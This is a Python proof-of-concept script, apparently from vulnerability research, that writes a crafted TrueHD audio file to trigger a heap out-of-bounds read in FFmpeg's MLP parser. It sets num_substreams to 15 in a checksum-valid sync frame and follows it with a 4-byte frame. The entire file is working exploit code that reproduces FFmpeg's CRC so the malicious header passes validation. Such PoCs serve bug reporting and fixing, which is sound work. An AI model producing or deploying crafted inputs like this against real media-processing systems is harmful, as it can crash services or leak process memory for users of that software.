#!/usr/bin/env python3
"""
PoC generator for VULN 001:
  mlp_parser Heap OOB Read via Unvalidated num_substreams in Parity Loop

Vulnerability path:
  mlp_parse() in mlp_parser.c:146-154 reads buf[p++] in a loop that runs
  (1 + mp->num_substreams) iterations, but does NOT check p < buf_size.
  When a sync frame sets num_substreams=15 and the next non-sync frame has
  only 4 bytes, the loop reads far beyond the buffer.

File structure:
  Frame 1 (32 bytes): valid TrueHD sync frame, num_substreams=15
  Frame 2 (4 bytes):  non-sync frame, too short for parity loop with 15 substreams
"""

import struct
import sys

OUTPUT = "vuln_001_input.thd"

# ---------------------------------------------------------------------------
# Reproduce FFmpeg's CRC-16 (polynomial 0x002D) exactly.
#
# From libavutil/crc.c, av_crc_init with le=0, bits=16, poly=0x002D:
#
#   for (c = i << 24, j = 0; j < 8; j++)
#       c = (c << 1) ^ ((poly << (32-bits)) & (((int32_t)c) >> 31));
#   ctx[i] = av_bswap32(c);
#
# av_crc (non-le path):
#   crc = ctx[((uint8_t) crc) ^ *buffer++] ^ (crc >> 8);
#
# This produces a little-endian representation of the big-endian CRC.
# ---------------------------------------------------------------------------

def _build_ffmpeg_crc_table_le0(bits, poly):
    """
    Build FFmpeg's CRC lookup table for le=0 mode.
    Entries are bswap32 of the standard big-endian CRC computation.
    """
    poly_shifted = (poly << (32 - bits)) & 0xFFFFFFFF
    table = []
    for i in range(256):
        c = (i << 24) & 0xFFFFFFFF
        for _ in range(8):
            # ((int32_t)c) >> 31 is -1 (0xFFFFFFFF) if MSB set, else 0
            if c & 0x80000000:
                c = ((c << 1) ^ poly_shifted) & 0xFFFFFFFF
            else:
                c = (c << 1) & 0xFFFFFFFF
        # av_bswap32: reverse the 4 bytes of the 32-bit value
        c_bytes = c.to_bytes(4, byteorder='big')
        c_le = int.from_bytes(c_bytes, byteorder='little')
        table.append(c_le)
    return table

_CRC16_2D_TABLE = _build_ffmpeg_crc_table_le0(bits=16, poly=0x002D)


def _av_crc(table, init, data):
    """
    FFmpeg's av_crc():  crc = ctx[(crc & 0xFF) ^ byte] ^ (crc >> 8)
    (The non-le single-byte path used when ctx[256] != 0.)
    """
    crc = init & 0xFFFFFFFF
    for b in data:
        crc = table[(crc & 0xFF) ^ b] ^ (crc >> 8)
    return crc & 0xFFFFFFFF


def mlp_checksum16(sync_hdr):
    """
    Equivalent to ff_mlp_checksum16(sync_hdr, header_size - 2)
    where header_size = 28, so buf_size_arg = 26:

        crc = av_crc(crc_2D, 0, buf, 24);   // first 24 bytes
        crc ^= AV_RL16(buf + 24);            // LE16 at bytes 24-25
        return (uint16_t)crc;

    The returned value must equal AV_RL16(buf + 26) (stored checksum).
    """
    crc = _av_crc(_CRC16_2D_TABLE, 0, sync_hdr[:24])
    crc = (crc ^ struct.unpack_from('<H', sync_hdr, 24)[0]) & 0xFFFF
    return crc


# ---------------------------------------------------------------------------
# Build the TrueHD major sync header (28 bytes, placed at frame offset 4)
#
# Bit layout (GetBitContext reads MSB-first within each byte):
#
#   Bits   0-23: sync word part 1 = 0xF8726F  (3 bytes)
#   Bits  24-31: stream_type      = 0xBA       (TrueHD)
#   Bits  32-35: ratebits         = 0          (48000 Hz)
#   Bits  36-39: skip 4 bits
#   Bits  40-41: channel_modifier_thd_stream0  = 0
#   Bits  42-43: channel_modifier_thd_stream1  = 0
#   Bits  44-48: channel_arrangement_stream1   = 1  (bit 0 = LR, stereo)
#   Bits  49-50: channel_modifier_thd_stream2  = 0
#   Bits  51-63: channel_arrangement_stream2   = 1  (bit 0 = LR, stereo)
#   Bits  64-111: skip 48 bits
#   Bit  112:    is_vbr           = 1
#   Bits 113-127: peak_bitrate    = 0
#   Bits 128-131: num_substreams  = 15 = 0xF   <-- the dangerous field
#   Bits 132-133: skip 2 bits
#   Bits 134-135: extended_substream_info = 0
#   Bits 136-143: substream_info  = 0
#   Bits 144-223: skip 80 bits (= (28-18)*8)
#   Bytes [26:28]: checksum (LE16, computed and patched)
#
# Byte-level mapping:
#   hdr[0..3]  = F8 72 6F BA
#   hdr[4]     = 0x00  (ratebits=0, skip=0)
#   hdr[5]     = 0x00  (cm0=00, cm1=00, ch_arr1[4:1]=0000)
#   hdr[6]     = 0x80  (ch_arr1[0]=1, cm2=00, ch_arr2[12:8]=00000)
#   hdr[7]     = 0x01  (ch_arr2[7:0]=1)
#   hdr[8..13] = 0x00 * 6   (skip 48 bits)
#   hdr[14]    = 0x80  (is_vbr=1, peak_bitrate[14:8]=0)
#   hdr[15]    = 0x00  (peak_bitrate[7:0]=0)
#   hdr[16]    = 0xF0  (num_substreams=0xF, skip2=00, esi=00)
#   hdr[17]    = 0x00  (substream_info=0)
#   hdr[18..25]= 0x00 * 8   (skip bits 144-207)
#   hdr[26..27]= CRC16  (computed)
# ---------------------------------------------------------------------------

def build_sync_header():
    hdr = bytearray(28)

    # Sync word + stream type
    hdr[0] = 0xF8
    hdr[1] = 0x72
    hdr[2] = 0x6F
    hdr[3] = 0xBA  # stream_type = SYNC_TRUEHD = 0xBA

    # Byte 4: ratebits=0 (48 kHz), skip=0
    hdr[4] = 0x00

    # Byte 5: cm0=00, cm1=00, ch_arr1[4:1]=0000
    hdr[5] = 0x00

    # Byte 6: ch_arr1[0]=1, cm2=00, ch_arr2[12:8]=00000
    # channel_arrangement_stream1 = 0b00001 → LSB=1, upper4=0
    hdr[6] = 0x80  # bit7=ch_arr1[0]=1, bits6-5=cm2=00, bits4-0=ch_arr2_high5=00000

    # Byte 7: ch_arr2[7:0] = 1
    # channel_arrangement_stream2 = 0b0000000000001 → low8=1
    hdr[7] = 0x01

    # Bytes 8-13: skip 48 bits (all zeros)

    # Byte 14: is_vbr=1 (bit7), peak_bitrate high 7 bits = 0
    hdr[14] = 0x80

    # Byte 15: peak_bitrate low 8 bits = 0
    hdr[15] = 0x00

    # Byte 16: num_substreams[3:0]=0xF=15, skip2=00, esi[1:0]=00
    # Bits 128-131 = 1111, bits 132-133 = 00, bits 134-135 = 00
    hdr[16] = 0xF0  # 1111_00_00

    # Byte 17: substream_info = 0
    hdr[17] = 0x00

    # Bytes 18-25: skip remaining bits (all zeros)

    # Compute checksum.
    # ff_mlp_checksum16 is called as ff_mlp_checksum16(hdr, 26):
    #   crc = av_crc(crc_2D, 0, hdr, 24)
    #   crc ^= AV_RL16(hdr + 24)    [= LE16(hdr[24:26]) = 0x0000]
    # This result must equal AV_RL16(hdr + 26) = LE16(hdr[26:28]).
    #
    # So: hdr[26:28] = struct.pack('<H', mlp_checksum16(hdr))
    crc = mlp_checksum16(hdr)
    struct.pack_into('<H', hdr, 26, crc)

    return bytes(hdr)


def build_frame1(sync_hdr):
    """
    32-byte TrueHD sync access unit.

    Access unit header (bytes 0-3):
      Bytes 0-1: length word.
        Parser formula: (AV_RB16(buf[0:2]) & 0x0FFF) * 2 = byte length.
        For 32 bytes: (val & 0xFFF) = 16, so val = 0x0010.
        buf[0] = 0x00, buf[1] = 0x10.
      Bytes 2-3: timing / padding (zeroes).
    Bytes 4-31: major sync header (28 bytes).
    """
    assert len(sync_hdr) == 28
    frame = bytearray(32)
    frame[0] = 0x00
    frame[1] = 0x10   # (0x0010 & 0x0FFF) * 2 = 16 * 2 = 32 bytes
    frame[2] = 0x00
    frame[3] = 0x00
    frame[4:32] = sync_hdr
    return bytes(frame)


def build_frame2():
    """
    4-byte non-sync access unit — triggers the heap OOB read.

    When the parser runs the parity loop with mp->num_substreams=15:
      for i in range(-1, 15):          # 16 iterations
          read buf[p++]                 # p advances
          read buf[p++]
          if i < 0 or buf[p-2] & 0x80:
              read buf[p++]
              read buf[p++]

    Iteration i=-1 reads 4 bytes → p=4.
    Iteration i=0 reads buf[4] → OUT-OF-BOUNDS (only 4 bytes in frame).

    Length field: (0x0002 & 0x0FFF) * 2 = 4 bytes.
    """
    frame = bytearray(4)
    frame[0] = 0x00
    frame[1] = 0x02   # (0x0002 & 0x0FFF) * 2 = 2 * 2 = 4 bytes
    frame[2] = 0x00
    frame[3] = 0x00
    return bytes(frame)


def main():
    sync_hdr = build_sync_header()
    f1 = build_frame1(sync_hdr)
    f2 = build_frame2()
    data = f1 + f2

    with open(OUTPUT, 'wb') as fh:
        fh.write(data)

    print(f"[+] Written {len(data)} bytes to {OUTPUT}")
    print(f"    Frame 1 ({len(f1)} bytes): TrueHD sync, num_substreams=15")
    print(f"    Frame 2 ({len(f2)} bytes): non-sync, triggers OOB in parity loop")
    print(f"    Sync header hex:  {sync_hdr.hex()}")
    print(f"    Frame 1 hex:      {f1.hex()}")
    print(f"    Frame 2 hex:      {f2.hex()}")

    # Verify checksum
    expected = mlp_checksum16(sync_hdr)
    stored   = struct.unpack_from('<H', sync_hdr, 26)[0]
    if expected == stored:
        print(f"[+] Checksum OK: 0x{stored:04X}")
    else:
        print(f"[-] Checksum MISMATCH: expected 0x{expected:04X}, stored 0x{stored:04X}")
        sys.exit(1)

    # Extra: print what table[1] is so we can sanity-check
    print(f"    CRC table[1]  = 0x{_CRC16_2D_TABLE[1]:08X}  (expected 0x00002D00)")
    print(f"    CRC table[128]= 0x{_CRC16_2D_TABLE[128]:08X}")


if __name__ == '__main__':
    main()
